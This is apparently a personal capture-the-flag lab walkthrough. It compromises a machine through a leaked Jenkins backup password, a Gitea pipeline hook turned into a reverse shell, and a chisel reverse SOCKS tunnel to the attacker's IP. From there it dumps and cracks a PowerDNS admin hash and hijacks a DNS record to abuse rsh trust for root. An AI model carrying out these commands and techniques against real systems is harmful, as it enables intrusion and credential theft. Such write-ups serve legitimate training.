nmap scan shows many ports, gitea on 3000, rsh at 512 - 514, PowerDNS at 53 and rsync at 873, also shows mysql at 3306 and another service at 8801 but both are filtered 
by enumerating rsync at 873, we are able to find a jenkins backup, and we can use the jenkins file to extract a password to the user buildadm, using a tool from github we find the pass is Git1234!
we use it to auth to gitea at port 3000, there we find a single repo with a single jenkinsfile, looking at hooks in the repo specifically, we see that there is a hook to fetch commits to the file, so by editing it we can get a revshell
by googling about shell commands from pipline file we can find the right format 
![[Pasted image 20250921211923.png]]
this lands me in a root shell inside the jenkins container
i check the container IP address using `hostname -I`
by checking the mounted files, we can tell that ext4 is our jenkins container, and there is something mounted at /root
![[Pasted image 20250921212111.png]]
checking the /root dir, we find a .rhosts file, this file is used to specify who is allowed or not allowed to connect to the host using rsh, to understand the contents of the file to the fullest, reading the documentation is needed.
![[Pasted image 20250921212304.png]]
now i need to set up a socks proxy to have further access to internal services.`
i download chisel binary from github, put it in python http server, download it to the container using curl -o, unpack it using dpkg-deb -x, run the server command on my kali `./chisel server --reverse --port 9080` and then the client command on the container 
`./chisel client 10.10.16.38:9080 R:socks &`
now that i have the chisel server running and the client connected, i can use proxychains4 to run commands through the socks proxy, i start by trying to check the DB `proxychains4 -f /etc/proxychains4.conf mysql -h 172.18.0.1 -u root --skip_ssl` this works, and i start by checking which db's are available with `show databases;` which reveals "powerdnsadmin" db, i use this db to move into it, then check `show tables;` there are many tables in the db, but the only relevant ones are 'user' and 'records'
![[Pasted image 20250921212923.png]]
by dumping the user table, i get the hash for admin user, which i can try to crack ( if i failed to crack it, i could just replace it with another hash)
but the hash cracks easily and is equivalent to "winston", now i just need to open my browser, and set foxyproxy to use the chisel socks tunnel, and by checking the records table, i can tell where the web interface for PowerDNS is running.
![[Pasted image 20250921213228.png]]
by having admin access to PowerDNS, i can simply change the A record for the intern.build.vl domain to my kali IP, which will let me run commands on the host using rsh
![[Pasted image 20250921213359.png]]
![[Pasted image 20250921213445.png]]
now as root, i can grab root.txt